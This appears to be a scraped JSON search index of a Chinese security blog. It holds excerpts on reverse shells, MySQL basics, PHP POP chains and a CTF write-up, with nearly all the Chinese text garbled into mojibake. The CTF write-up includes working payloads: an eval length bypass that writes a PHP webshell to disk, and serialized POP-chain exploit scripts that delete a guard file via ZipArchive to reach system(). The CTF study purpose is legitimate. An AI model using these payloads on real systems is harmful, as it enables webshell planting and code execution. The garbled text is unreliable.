å‚è€ƒ:https://xz.aliyun.com/t/2549#toc-4","link":"/2021/02/03/linux%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E6%9C%AC%E8%B4%A8-%E4%BA%8C/"},{"title":"linuxåå¼¹shellçš„æœ¬è´¨(ä¸€)","text":"æ–‡ä»¶æè¿°ç¬¦å®šä¹‰linuxæ–‡ä»¶æè¿°ç¬¦ï¼šå¯ä»¥ç†è§£ä¸ºlinuxè·Ÿè¸ªæ‰“å¼€æ–‡ä»¶ï¼Œè€Œåˆ†é…çš„ä¸€ä¸ªæ•°å­—ï¼Œè¿™ä¸ªæ•°å­—æœ‰ç‚¹ç±»ä¼¼cè¯­è¨€æ“ä½œæ–‡ä»¶æ—¶å€™çš„å¥æŸ„ï¼Œé€šè¿‡å¥æŸ„å°±å¯ä»¥å®ç°æ–‡ä»¶çš„è¯»å†™æ“ä½œã€‚ å½“Linuxå¯åŠ¨çš„æ—¶å€™ä¼šé»˜è®¤æ‰“å¼€ä¸‰ä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼Œåˆ†åˆ«æ˜¯ï¼š æ ‡å‡†è¾“å…¥standard input 0 **ï¼ˆé»˜è®¤è®¾å¤‡é”®ç›˜ï¼‰æ ‡å‡†è¾“å‡ºstandard output **1ï¼ˆé»˜è®¤è®¾å¤‡æ˜¾ç¤ºå™¨ï¼‰é”™è¯¯è¾“å‡ºï¼šerror output 2ï¼ˆé»˜è®¤è®¾å¤‡æ˜¾ç¤ºå™¨ï¼‰ æ–‡ä»¶æ‰€æœ‰è¾“å…¥è¾“å‡ºéƒ½æ˜¯ç”±è¯¥è¿›ç¨‹æ‰€æœ‰æ‰“å¼€çš„æ–‡ä»¶æè¿°ç¬¦æ§åˆ¶çš„ã€‚ï¼ˆLinuxä¸€åˆ‡çš†æ–‡ä»¶ï¼Œå°±è¿é”®ç›˜æ˜¾ç¤ºå™¨è®¾å¤‡éƒ½æ˜¯æ–‡ä»¶ï¼Œå› æ­¤ä»–ä»¬çš„è¾“å…¥è¾“å‡ºä¹Ÿæ˜¯ç”±æ–‡ä»¶æè¿°ç¬¦æ§åˆ¶ï¼‰ é‡å®šå‘å®šä¹‰ï¼šé¡¾åæ€ä¹‰ï¼Œé‡å®šå‘ï¼Œå°±æ˜¯æ”¹å˜è¾“å…¥è¾“å‡ºçš„æ–¹å‘ï¼Œé’ˆå¯¹æ–‡ä»¶æè¿°ç¬¦çš„æ“ä½œè¾“å…¥æ–¹å‘å°±æ˜¯æ•°æ®ä»å“ªé‡Œæµå‘ç¨‹åºã€‚æ•°æ®é»˜è®¤ä»é”®ç›˜æµå‘ç¨‹åºï¼Œå¦‚æœæ”¹å˜äº†å®ƒçš„æ–¹å‘ï¼Œæ•°æ®å°±ä»å…¶å®ƒåœ°æ–¹æµå…¥ï¼Œè¿™å°±æ˜¯è¾“å…¥é‡å®šå‘ã€‚è¾“å‡ºæ–¹å‘å°±æ˜¯æ•°æ®ä»ç¨‹åºæµå‘å“ªé‡Œã€‚æ•°æ®é»˜è®¤ä»ç¨‹åºæµå‘æ˜¾ç¤ºå™¨ï¼Œå¦‚æœæ”¹å˜äº†å®ƒçš„æ–¹å‘ï¼Œæ•°æ®å°±æµå‘å…¶å®ƒåœ°æ–¹ï¼Œè¿™å°±æ˜¯è¾“å‡ºé‡å®šå‘ç¬¦å·ï¼šï¼ˆ1ï¼‰è¾“å…¥é‡å®šå‘ &lt; &lt;&lt;ï¼ˆ2ï¼‰è¾“å‡ºé‡å®šå‘ &gt; &gt;&gt;é‚£ä¹ˆå¦‚ä½•å®ç°é‡å®šå‘ä¾é çš„å°±æ˜¯æ”¹å˜æ–‡ä»¶æè¿°ç¬¦ æ€»ç»“ä¸€ä¸‹è¯ï¼Œå°±æ˜¯æŠŠåŸæœ¬è¦è¾“å‡ºçš„å†…å®¹è¾“å‡ºåˆ°æ–‡æœ¬ä¸­ï¼ŒæŠŠåŸæœ¬è¦è¾“å…¥çš„å†…å®¹ä»æ–‡æœ¬ä¸­è¾“å…¥ æ·±å…¥ç†è§£1.bashåœ¨æ‰§è¡Œä¸€æ¡æŒ‡ä»¤çš„æ—¶å€™ï¼Œé¦–å…ˆä¼šæ£€æŸ¥å‘½ä»¤ä¸­å­˜ä¸å­˜åœ¨é‡å®šå‘çš„ç¬¦å·ï¼Œå¦‚æœå­˜åœ¨é‚£ä¹ˆé¦–å…ˆå°†æ–‡ä»¶æè¿°ç¬¦é‡å®šå‘2.å¦‚æœæœ‰å¤šä¸ªé‡å®šå‘ç¬¦å·ï¼Œéµå¾ªä»å·¦åˆ°å³çš„çš„é¡ºåºï¼Œåˆ‡ä¸è¦éšä¾¿æ”¹å˜é¡ºåºï¼Œä¼šå¸¦æ¥ä¸ä¸€æ ·çš„ç»“æœ3.&lt; æ˜¯å¯¹æ ‡å‡†è¾“å…¥0é‡å®šå‘ï¼Œ&gt;æ˜¯å¯¹æ ‡å‡†è¾“å‡º1é‡å®šå‘ 1.è¾“å…¥é‡å®šå‘æ ¼å¼ï¼š [n]&lt; word ï¼ˆæ³¨æ„[n]ä¸&lt;ä¹‹é—´æ²¡æœ‰ç©ºæ ¼ï¼‰ è¯´æ˜ï¼šå°†æ–‡ä»¶æè¿°ç¬¦ n é‡å®šå‘åˆ° word æŒ‡ä»£çš„æ–‡ä»¶ï¼ˆä»¥åªè¯»æ–¹å¼æ‰“å¼€ï¼‰,å¦‚æœnçœç•¥å°±æ˜¯0ï¼ˆæ ‡å‡†è¾“å…¥ï¼‰ ![img](https://raw.githubusercontent.com/Hwwg/myphoto/master/20210203204231.png) è§£é‡Š:è§£æå™¨è§£æåˆ°","link":"/2021/02/03/linux%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E6%9C%AC%E8%B4%A8/"},{"title":"my first time to use typro","text":"ç¬¬ä¸€æ¬¡ä½¿ç”¨typro","link":"/2020/10/05/my-first-time-to-use-typro/"},{"title":"mysqlå¢åˆ æ”¹æŸ¥","text":"åˆ›å»ºæ•°æ®åº“åˆ›å»ºæ•°æ®åº“çš„æ–¹æ³•æœ‰1.create database ï¼ˆæ•°æ®åº“åï¼‰ï¼›2.ç”¨mysqladmin åˆ›å»ºæ•°æ®åº“: mysqladmin -u root -p create (æ•°æ®åº“å)3åˆ©ç”¨PHPè„šæœ¬åˆ›å»ºæ•°æ®åº“ åˆ é™¤æ•°æ®åº“1.drop database ï¼ˆæ•°æ®åº“åå­—ï¼‰ï¼› é€‰æ‹©æ•°æ®åº“1.åˆ©ç”¨ useï¼ˆæ•°æ®åº“åå­—ï¼‰ ä¿®æ”¹æ•°æ®åº“1.ä¿®æ”¹æ•°æ®åº“çš„è¾“å…¥æ•°æ®ç±»å‹æ ¼å¼ï¼šalter table ï¼ˆè¡¨åï¼‰ modify ï¼ˆè¦ä¿®æ”¹çš„å†…å®¹ï¼‰2.å¢æ·»æ•°æ®åº“ä¸­çš„ä¸€ä¸ªè¾“å…¥é¡¹æ ¼å¼ï¼šalter table ï¼ˆè¡¨åï¼‰add ï¼ˆè¦å¢åŠ çš„å†…å®¹ï¼‰3.æ›´æ”¹åŸæœ¬çš„æ•°æ®åº“é¡¹ç›®åå­—æ ¼å¼ï¼š alter table ï¼ˆè¡¨åï¼‰change columnï¼ˆè¦ä¿®æ”¹çš„ï¼‰ ï¼ˆä¿®æ”¹ç»“æœï¼‰ï¼ˆæ•°æ®ç±»å‹ï¼‰4.ä¿®æ”¹è¡¨åæ ¼å¼ï¼šalter table ï¼ˆåŸæœ¬è¡¨åï¼‰ rename ï¼ˆç°åœ¨æƒ³è¦çš„è¡¨åï¼‰è¿™ä¸¤ä¸ªéƒ½æ˜¯å±äºç»“æ„è®¾è®¡èŒƒç•´çš„ã€‚ mysqlçš„å¢åˆ æ”¹æŸ¥é¦–å…ˆæ˜¯å®ƒä»¬çš„è¯­å¥å‘½ä»¤ å¢:insertåˆ :deleteæ”¹ï¼šupdateæŸ¥:SELECTæˆ–è€…showæ ¼å¼å‘æ‰€æœ‰å­—æ®µæ’å…¥ï¼šinsert into è¡¨åï¼ˆå­—æ®µ1ï¼Œå­—æ®µ2ï¼Œå­—æ®µ3â€¦â€¦ï¼‰values(å€¼1,å€¼2ï¼Œå€¼3â€¦â€¦)ï¼›å‘æŒ‡å®šå­—æ®µæ’å…¥:insert into è¡¨åï¼ˆæŒ‡å®šå­—æ®µé›†åˆï¼‰ valuseï¼ˆæŒ‡å®šå­—æ®µå€¼ï¼‰; å®ä¾‹ 123create table test(id int, name varchar(40),sex varchar(4),birthday date);//æ–°å»ºä¸€ä¸ªè¡¨insert into test(id,name,sex,birthday)//å¢åŠ æ•°æ®ï¼ˆæ’å…¥æ•°æ®ï¼‰values(1ï¼Œ'zhangsan'ï¼Œ'male','2001-08-06'); 12update test set sex=female;//æ‰€æœ‰å‘˜å·¥æ€§åˆ«æ›´æ”¹ä¸ºå¥³æ€§update test set sex = female where name ='zhangsan';//æ›´æ”¹å¼ ä¸‰è¿™ä¸ªå‘˜å·¥çš„æ€§åˆ« è¿™è¾¹è¯´ä¸€ä¸‹whereè¿™ä¸ªå‡½æ•°çš„æ„æ€ï¼šwhereå¯ä»¥æŒ‡å®šä½ æƒ³æ›´æ¢çš„æ•°æ®è¡Œã€‚åˆ é™¤è¡¨æ•°æ®ä¸¾ä¾‹å­å§ï¼š 123delete from test where name='zhangsan';//åˆ é™¤è¡¨ä¸­å¼ ä¸‰çš„è®°å½•delete from test;//åˆ é™¤è¡¨ä¸­æ‰€æœ‰çš„è®°å½•truncate table test;//ä½¿ç”¨truncateåˆ é™¤è¡¨ä¸­è®°å½• æŸ¥è¯¢è¡¨æ•°æ® æ ¼å¼ï¼šselect *æˆ–è€…ã€å­—æ®µåã€‘ from è¡¨åï¼›æŸ¥è¯¢æ‰€æœ‰å­—æ®µå’Œéƒ¨åˆ†å­—æ®µã€‚ 1234567select id,name,sex,birthday from test;//ä»è¡¨ä¸­è·å–å…¨éƒ¨æ•°æ®select name, birthday from test;//ä»è¡¨ä¸­è·å–å§“åå’Œç”Ÿæ—¥çš„ä¿¡æ¯select birthday from test where sex=maleï¼›//è·å–æ€§åˆ«ä¸ºç”·æ€§çš„ç”Ÿæ—¥select æ•°å­—ï¼Œæ•°å­—ï¼Œæ•°å­—ï¼Œæ•°å­—........;//å¯ä»¥æŸ¥è¯¢æŒ‡å®šå­—æ®µçš„æ•°æ®select è¦æŸ¥è¯¢çš„å­—æ®µå from åº“å.è¡¨åï¼›select è¦æŸ¥è¯¢çš„å­—æ®µå from åº“å.è¡¨å where å·²çŸ¥æ¡ä»¶çš„å­—æ®µå='å·²çŸ¥æ¡ä»¶çš„å€¼'ï¼›select è¦æŸ¥è¯¢çš„å­—æ®µå from åº“å.è¡¨å where å·²çŸ¥æ¡ä»¶1çš„å­—æ®µå='å·²çŸ¥æ¡ä»¶1çš„å€¼' and å·²çŸ¥æ¡ä»¶2çš„å­—æ®µå='å·²çŸ¥æ¡ä»¶2çš„å€¼' ä½¿ç”¨distinctå»é™¤é‡å¤æ•°æ®select distinct å­—æ®µå from è¡¨åï¼›ä½¿ç”¨limitæŒ‡å®šæŸ¥è¯¢ç»“æœçš„è¡Œæ•°select å­—æ®µå from drom è¡¨å limit nï¼›å®ä¾‹select *from stu limit 1; ä½¿ç”¨order by å¯¹ç»“æœè¿›è¡Œæ’åºorder by å­—æ®µå ASC/DESC ä¿®æ”¹è¡¨æ•°æ®è¯­æ³•ï¼šupdate è¡¨å set å­—æ®µ1=å€¼ï¼Œå­—æ®µ2=å€¼ ï¼›æ’å…¥æ•°æ®insert","link":"/2020/10/20/mysql%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/"},{"title":"nepæ¬¢ä¹èµ›","text":"little trickçŸ¥è¯†å‚¨å¤‡**``**åå¼•å·ï¼šåå¼•å·å¯ä»¥ç”¨æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ **&gt;**ï¼šè¾“å‡ºé‡å®šå‘ç¬¦å·:(linuxåå¼¹shellæœ¬è´¨åšå®¢ä¸­æœ‰è®²è§£)å¯ä»¥å°†å†…å®¹é‡å®šå‘è¾“å‡ºè‡³æŸä¸ªä½ç½® æ€è·¯:è¿™é‡Œä¸€å…±å°±ä¸‰ä¸ªå…³é”®å‡½æ•°ï¼Œintvalã€strlenã€substrã€æŸ¥æ‰¾äº†å‰é¢ä¸¤ä¸ªçš„trickéƒ½å¯¹è§£é¢˜æ²¡æœ‰å¸®åŠ©ï¼Œäºæ˜¯çœ‹äº†ä¸€ä¸‹substrå‡½æ•°ï¼Œå¯ä»¥ä½¿ç”¨-1è¿›è¡Œå€’ç€æˆªæ–­ï¼Œé‚£ä¹ˆæ­¤æ—¶ä¹Ÿå°±ç»•è¿‡äº†len&lt;-1çš„é™åˆ¶ 1234567891011 &lt;?php error_reporting(0); highlight_file(__FILE__); $nep = $_GET['nep']; $len = $_GET['len']; if(intval($len)&lt;8 &amp;&amp; strlen($nep)&lt;13){ eval(substr($nep,0,$len)); }else{ die('too long!'); }?&gt; æ¥ä¸‹æ¥å°±æ˜¯æ„é€ evalæ‰§è¡Œè¯­å¥: è¿™é‡Œç›´æ¥æ”¾payloadè¿›è¡Œåˆ†æï¼š 123?len=-1&amp;nep=`$_GET[a]`;;&amp;a=ls&gt;1.php?len=-1&amp;nep=`$_GET[a]`;;&amp;a=cat *&gt;1.php?len=-1&amp;nep=`$_GET[a]`;;&amp;a=echo \\&lt;\\?php eval\\(\\$_POST\\[a\\]\\)\\;&gt;123.php//å­¦é•¿è§£æ³• ä»nepåé¢å¼€å§‹åˆ†æï¼šç”±äºæˆ‘ä»¬è¾“å…¥çš„æ‰§è¡Œçš„ä»£ç ç¨‹åº¦æ˜¯æœ‰é™åˆ¶çš„ï¼Œæ‰€ä»¥è¿™é‡Œä½¿ç”¨ä¸€ä¸ªGETæŒ‡ä»¤ä¼ å‚ï¼Œè¿™ç®—æ˜¯ä¸€ç§æ‹¼æ¥æ‰‹æ³•ã€‚è¿™æ¡æŒ‡ä»¤æ‹¼æ¥å®Œä»¥åå°±å˜æˆäº†ï¼š 123`ls&gt;1.php``cat *&gt;1.php``echo \\&lt;\\?php eval\\(\\$_POST\\[a\\]\\)\\;&gt;123.php` è¿™é‡Œæˆ‘ä»¬åˆ†éƒ¨åˆ†è¯¦è§£: ``åŠ åå¼•å·ï¼Œæ‰€ä»¥å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„echoï¼Œç³»ç»Ÿå‘½ä»¤çš„echoæ˜¯å¯ä»¥è¾“å…¥å†…å®¹åˆ°æ–‡ä»¶ä¸­çš„ï¼Œæ ¼å¼: 1echo å†…å®¹ &gt;æ–‡ä»¶å ä¸ºä»€ä¹ˆéœ€è¦&gt;æ–‡ä»¶è¾“å‡ºé‡å®šå‘ï¼Ÿæˆ‘ä»¬å¯ä»¥å‘ç°åœ¨è¿™æ®µä»£ç ä¸­æ˜¯æ²¡æœ‰echoä¹‹ç±»çš„è¾“å‡ºå‡½æ•°çš„ï¼Œæ‰€ä»¥æ­¤æ—¶æˆ‘ä»¬æƒ³è¦è¾“å‡ºå†…å®¹å°±éœ€è¦ä½¿ç”¨è¾“å‡ºé‡å®šå‘ï¼Œå°†æ‰§è¡Œå‘½ä»¤çš„ç»“æœé‡å®šå‘è¾“å‡ºè‡³å…¶ä»–æ–‡ä»¶ä¸­ï¼Œå†…å®¹æ‰å¯ä»¥æ˜¾ç°ã€‚ ä¸ºä»€ä¹ˆéœ€è¦åæ–œæ ï¼šè¿™é‡Œçš„åæ–œæ æ˜¯ä¸ºäº†å±è”½ä¸€äº›å­—ç¬¦çš„ä½œç”¨ï¼Œæˆ‘ä»¬çŸ¥é“``é‡Œé¢æ˜¯æ‰§è¡Œäº†ç³»ç»Ÿå‘½ä»¤ï¼Œåœ¨linuxç³»ç»Ÿé‡Œé¢&lt; ç­‰éƒ½æ˜¯æœ‰å…¶ä»–æ„ä¹‰çš„ï¼Œå¦‚æœä¸åŠ åæ–œæ ç›´æ¥è¾“å…¥ä¼šæœ‰æ­§ä¹‰å¯¼è‡´è¾“å…¥é”™è¯¯ åå¼•å·ä½¿ç”¨è¯¦ç»†å‚è€ƒå‚è€ƒ:https://blog.csdn.net/u012005313/article/details/46241473 bbxhh_revengeè¿™é¢˜å†™çš„æ˜¯æŒºæ— è¯­çš„ï¼Œè¦ä¸€ç›´æ¢ipï¼Œæˆ‘æ˜¯ç”¨åˆ©ç”¨æ‰‹æœºæ¢é£è¡Œæ¨¡å¼ï¼Œå†æ¢å›æ¥ï¼Œipä¼šæ”¹å˜ï¼Œç„¶åç”¨æµé‡æ”¾çƒ­ç‚¹è¾¾åˆ°æ›´æ¢ipçš„æ•ˆæœ: ç„¶åä¸‹é¢åœ¨å°è¯•å‚æ•°çš„æ˜¯æ¯”è¾ƒéš¾å—çš„ï¼Œæ„Ÿè§‰æœ‰ç‚¹è„‘æ´ï¼Œæˆ‘ä¹Ÿæ˜¯åœ¨å°è¯•çš„è¿‡ç¨‹ä¸­ å¤šåŠ äº†ä¸€ä¸ªä¸€ä¸ªimaginçš„å‚æ•°ï¼Œç”»é¢å›æ˜¾æ‰æœ‰ä¸åŒï¼Œæ¥ä¸‹æ¥å°±å’Œå­¦é•¿ä¸€èµ·è®¨è®ºå¾€ä¸‹åšã€‚ éé¢„æœŸè§£ è¿™ä¸ªä¹Ÿæ˜¯åæ¥æ‰çŸ¥é“çš„:åœ¨å°è¯•å‚æ•°çš„è¿‡ç¨‹ä¸­ ä»–æœ‰è¯´ä¸€å¥è¯:ä½ å·²ç»å¯ä»¥å¾—åˆ°phpinfoäº†ï¼Œä½†æ˜¯å½“æ—¶æ²¡ç†è§£è¿™å¥è¯çš„æ„æ€ï¼Œåæ¥æ‰çŸ¥é“ï¼ŒåŸæ¥åœ¨imaginååŠ ä¸Šå‡½æ•°æ‰å¯ä»¥æ‰“å¼€ é¢„æœŸè§£: 123456789101112131415161718192021222324252627&lt;?phpfunction waf($s){ return preg_replace('/sys|exec|sh|flag|pass|file|open|dir|2333|;|#|\\/\\/|&gt;/i',&quot;NepnEpneP&quot;,$s);}if(isset($_GET['a'])){ $_=waf($_GET['a']); $__=waf($_GET['b']); $a=new $_($__);//new XMLReader}else{ $a=new Error('?');}if(isset($_GET['c'])&amp;&amp; isset($_GET['d'])){ $c=waf($_GET['c']); $d=waf($_GET['d']); eval(&quot;$a-&gt;$c($d)&quot;);//XMLReader -&gt; open('data.xml')}else{ $c='getMesssage'; $d=&quot;&quot;; eval(&quot;echo $a-&gt;$c($d);&quot;);}?&gt; æ‹¿åˆ°æºç å’Œå­¦é•¿æƒ³çš„æ˜¯åˆ©ç”¨å†…ç½®ç±»ï¼Œä½†æ˜¯æœ‰ä¸ªå‚æ•°é—®é¢˜æ²¡æ³•è§£å†³ï¼Œæ‰€ä»¥è¿˜åœ¨ç­‰æ­£ç»wp æ¢¦é‡ŒèŠ±å¼€ç‰¡ä¸¹äº­12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273 &lt;?phphighlight_file(__FILE__);error_reporting(0);include('shell.php');class Game{ public $username; public $password; public $choice; public $register; public $file; public $filename; public $content; public function __construct() { $this-&gt;username='user'; $this-&gt;password='user'; } public function __wakeup(){//è¿™ä¸ªæ˜¯md5åŠ å¯†ï¼Œè§£å¯†åä¸ºadminï¼Œé‚£è¿™é‡Œåº”è¯¥å°±éœ€è¦ä¼ å…¥ä¸ªadmin if(md5($this-&gt;register)===&quot;21232f297a57a5a743894a0e4a801fc3&quot;){ $this-&gt;choice=new login($this-&gt;file,$this-&gt;filename,$this-&gt;content);//æ–°å»ºä¸€ä¸ªloginç±» }else{ $this-&gt;choice = new register(); } } public function __destruct() { $this-&gt;choice-&gt;checking($this-&gt;username,$this-&gt;password); }}class login{ public $file; public $filename; public $content; public function __construct($file,$filename,$content) { $this-&gt;file=$file; $this-&gt;filename=$filename; $this-&gt;content=$content; } public function checking($username,$password) { if($username==='admin'&amp;&amp;$password==='admin'){//åœ¨checkingé‡Œé¢ä¼šæ£€æŸ¥usernameå’Œpasswordï¼Œ $this-&gt;file-&gt;open($this-&gt;filename,$this-&gt;content); die('login success you can to open shell file!');//æˆåŠŸäº†æ‰å¯ä»¥æ‰“å¼€ã€‚ } }}class register{ public function checking($username,$password)//è¿™è¾¹å°±ä¼šæ£€æŸ¥äº† { if($username==='admin'&amp;&amp;$password==='admin'){ die('success register admin'); }else{ die('please register admin '); } }}class Open{ function open($filename, $content){ if(!file_get_contents('waf.txt')){ shell($content); }else{ echo file_get_contents($filename.&quot;.php&quot;); } }}if($_GET['a']!==$_GET['b']&amp;&amp;(md5($_GET['a']) === md5($_GET['b'])) &amp;&amp; (sha1($_GET['a'])=== sha1($_GET['b']))){ @unserialize(base64_decode($_POST['unser']));} è¿™ä¸ªæ˜¯ååºåˆ—åŒ–æ¼æ´ï¼Œä½†æ˜¯æˆ‘ååºåˆ—åŒ–æ¼æ´åªæ˜¯å­¦äº†ä¸€ä¸ªæ¯”è¾ƒç®€å•_wakeup()å‡½æ•°çš„ç»•è¿‡ï¼Œè¯•ç€åšä¸€ä¸‹è¿™é¢˜,æœ¬æ¥æƒ³çœ‹ç€å­¦é•¿ä»¬çš„wpåšï¼Œä½†æ˜¯æƒ³äº†ä¸€ä¸‹ï¼Œååºåˆ—åŒ–é—®é¢˜æœ‰é‡åˆ°è¿‡äº†ï¼Œè¿˜æ˜¯å°è¯•è‡ªå·±åšä¸€ä¸‹ POPé“¾æ¡1.ååºåˆ—åŒ–è§¦å‘wake_upæ–¹æ³•ï¼Œwake_upæ–¹æ³•ä¸­åšäº†ä¸€ä¸ªåˆ¤æ–­ï¼Œæˆ‘ä»¬è¾“å…¥çš„adminçš„æ—¶å€™å°†ä¼šè·³è½¬åˆ°loginç±»å½“ä¸­ï¼Œä¼šå…ˆä½¿ç”¨constructæ–¹æ³•ï¼Œå¯¹å„ä¸ªå˜é‡è¿›è¡Œèµ‹å€¼2.æ¥ä¸‹æ¥å°†å°±ä¼šè¿”å›åˆ°Gameç±»ä¸­è°ƒç”¨_destructè°ƒç”¨æ–¹æ³•ï¼Œåˆè¿›å…¥åˆ°checkingç±»ä¸­3.æ­¤æ—¶å°†ä¼šè°ƒç”¨checkingæ–¹æ³•ï¼Œè¿™é‡Œæœ‰ä¸ªå‚æ•° fileï¼Œæˆ‘ä»¬è¦å¯¹fileèµ‹å€¼è®©ä»–è¿›å…¥Openç±»ä¸­è°ƒç”¨file_get_contentså‡½æ•° EXP1234567891011121314151617181920212223242526&lt;?phpclass Game{ public $username; public $password; public $choice; public $register; public $file; public $filename; public $content;}class login{}class register{}class Open{}$a=new Game;$b=new Open;$a-&gt;register=&quot;admin&quot;;$a-&gt;filename=&quot;shell&quot;;$a-&gt;file=$b;$a-&gt;username=&quot;admin&quot;;$a-&gt;password=&quot;admin&quot;;print(base64_encode(serialize($a)));?&gt; æ¥ä¸‹æ¥ä¼šè·å¾—ä»¥ä¸‹æ–‡ä»¶: 1234567891011function shell($cmd){ if(strlen($cmd)&lt;10){ if(preg_match('/cat|tac|more|less|head|tail|nl|tail|sort|od|base|awk|cut|grep|uniq|string|sed|rev|zip|\\*|\\?/',$cmd)){ die(&quot;NO&quot;); }else{ return system($cmd); } }else{ die('so long!'); }} åŸæ¥è¿™æ®µä»£ç è¿˜æ²¡ç»“æŸï¼Œè¿˜æœ‰ä¸‹æ–‡ï¼Œè¿™é‡Œæœ‰ä¸ªshellæ–¹æ³•æ˜¯åœ¨æˆ‘ä»¬ä¸Šé¢é‚£ä¸ªåˆ¤æ–­è¯­å¥å½“ä¸­çš„ï¼Œå½“waf.txtä¸å­˜åœ¨çš„æ—¶å€™æ‰ä¼šè°ƒç”¨è¿™ä¸ªshellæ–¹æ³•ç°åœ¨æˆ‘ä»¬éœ€è¦åˆ é™¤è¿™ä¸ªwaf.txtï¼Œç”±äºä»¥ä¸Šæ²¡æœ‰æˆ‘ä»¬å¯ä»¥åˆ©ç”¨çš„ç±»ï¼Œæ‰€ä»¥è¿™é‡Œå¾ˆæ˜æ˜¾éœ€è¦ä½¿ç”¨å†…ç½®ç±»è¿›è¡Œåˆ é™¤ï¼ˆè·Ÿé‚£ä¸ªbbxhh-revengeæœ‰ç¥ä¼¼çš„åœ°æ–¹ï¼‰è¿™é‡Œéœ€è¦å¯»æ‰¾ä¸€ä¸ªèƒ½ç›´æ¥åˆ é™¤çš„å†…ç½®ç±»: åˆ©ç”¨æ­¤ä»£ç å³å¯åˆ é™¤ æ‰€ä»¥åºåˆ—åŒ–ä¸€ä¸‹ï¼š 12345678910111213141516171819202122232425262728&lt;?phpclass Game{ public $username; public $password; public $choice; public $register; public $file; public $filename; public $content;}class login{}class register{}class Open{}$a=new Game;//$b=new Open;$zip=new ZipArchive();$a-&gt;register=&quot;admin&quot;;$a-&gt;filename=&quot;waf.txt&quot;;$a-&gt;content=ZipArchive::OVERWRITE;//è¿™é‡Œè®°å¾—ä¸èƒ½åŠ å¼•å·$a-&gt;file=$zip;$a-&gt;username=&quot;admin&quot;;$a-&gt;password=&quot;admin&quot;;print(base64_encode(serialize($a))); æ¥ä¸‹æ¥å°±æ˜¯å†™å…¥ä»£ç æ‰§è¡Œshelläº† åœ¨ååºåˆ—åŒ–é‚£è¾¹å¯¹contentå‚æ•°è¿›è¡Œä¿®æ”¹ï¼ˆç”¨å¾—æ˜¯ç¬¬ä¸€ä¸ªååºåˆ—åŒ–ä»£ç ï¼‰ï¼Œæ‰§è¡Œlsæ²¡æ‰¾åˆ°flagåº”è¯¥æ˜¯åœ¨æ ¹ç›®å½•äº†ï¼Œç„¶åls / å‘ç°flagç›®å½• æ„Ÿè§‰flagå°±åœ¨é‡Œé¢äº†ï¼Œäºæ˜¯ä½¿ç”¨php /flagå³å¯æ‰“å¼€","link":"/2021/03/21/nep%E6%AC%A2%E4%B9%90%E8%B5%9B/"},{"title":"phpååºåˆ—åŒ–popé“¾æ„é€ ","text":"å‰è¨€:nepæ¯”èµ›åšäº†å¾ˆå¤šå…³äºç±»çš„è°ƒç”¨ä»¥åŠååºåˆ—åŒ–é—®é¢˜ï¼Œæ­£å¥½è¿™å—å†…å®¹æ˜¯æˆ‘è¿˜æ²¡å­¦ä¹ çš„ï¼ˆæ—©çŸ¥é“å¯’å‡çš„æ—¶å€™å°±è€ç€æ€§å­å­¦å®Œäº†ï¼‰ï¼Œäºæ˜¯è¶ç€éƒ¨é—¨çš„å·¥ä½œä»Šå¤©è¿˜æ²¡å®‰æ’ï¼Œå†³å®šèµ¶ç´§å¼€å§‹åšä¸€ä¸‹ã€‚ popé“¾ä»‹ç»ä»ç°æœ‰ç±»ä¸­å¯»æ‰¾æˆ‘ä»¬å¯ä»¥æ¶æ„ä½¿ç”¨çš„æ–¹æ³•ã€å‡½æ•°ï¼Œæ„é€ åˆ©ç”¨é“¾ï¼Œä½¿å¾—ç¨‹åºä¼šæŒ‰ç€æˆ‘ä»¬çš„éœ€è¦æœ€ç»ˆæ‰§è¡Œæ¶æ„è¯­å¥ é¢„å¤‡çŸ¥è¯† æ–¹æ³•å è°ƒç”¨æ¡ä»¶ __call è°ƒç”¨ä¸å¯è®¿é—®æˆ–ä¸å­˜åœ¨çš„æ–¹æ³•æ—¶è¢«è°ƒç”¨ __callStatic è°ƒç”¨ä¸å¯è®¿é—®æˆ–ä¸å­˜åœ¨çš„é™æ€æ–¹æ³•æ—¶è¢«è°ƒç”¨ __clone è¿›è¡Œå¯¹è±¡cloneæ—¶è¢«è°ƒç”¨ï¼Œç”¨æ¥è°ƒæ•´å¯¹è±¡çš„å…‹éš†è¡Œä¸º __constuct æ„å»ºå¯¹è±¡çš„æ—¶è¢«è°ƒç”¨ï¼› __debuginfo å½“è°ƒç”¨var_dump()æ‰“å°å¯¹è±¡æ—¶è¢«è°ƒç”¨ï¼ˆå½“ä½ ä¸æƒ³æ‰“å°æ‰€æœ‰å±æ€§ï¼‰é€‚ç”¨äºPHP5.6ç‰ˆæœ¬ __destruct æ˜ç¡®é”€æ¯å¯¹è±¡æˆ–è„šæœ¬ç»“æŸæ—¶è¢«è°ƒç”¨ï¼› __get è¯»å–ä¸å¯è®¿é—®æˆ–ä¸å­˜åœ¨å±æ€§æ—¶è¢«è°ƒç”¨ __invoke å½“ä»¥å‡½æ•°æ–¹å¼è°ƒç”¨å¯¹è±¡æ—¶è¢«è°ƒç”¨ __isset å¯¹ä¸å¯è®¿é—®æˆ–ä¸å­˜åœ¨çš„å±æ€§è°ƒç”¨isset()æˆ–empty()æ—¶è¢«è°ƒç”¨ __set å½“ç»™ä¸å¯è®¿é—®æˆ–ä¸å­˜åœ¨å±æ€§èµ‹å€¼æ—¶è¢«è°ƒç”¨ __set_state å½“è°ƒç”¨var_export()å¯¼å‡ºç±»æ—¶ï¼Œæ­¤é™æ€æ–¹æ³•è¢«è°ƒç”¨ã€‚ç”¨__set_stateçš„è¿”å›å€¼åšä¸ºvar_exportçš„è¿”å›å€¼ã€‚ __sleep å½“ä½¿ç”¨serializeæ—¶è¢«è°ƒç”¨ï¼Œå½“ä½ ä¸éœ€è¦ä¿å­˜å¤§å¯¹è±¡çš„æ‰€æœ‰æ•°æ®æ—¶å¾ˆæœ‰ç”¨ __toString å½“ä¸€ä¸ªç±»è¢«è½¬æ¢æˆå­—ç¬¦ä¸²æ—¶è¢«è°ƒç”¨ __unset å¯¹ä¸å¯è®¿é—®æˆ–ä¸å­˜åœ¨çš„å±æ€§è¿›è¡Œunsetæ—¶è¢«è°ƒç”¨ __wakeup 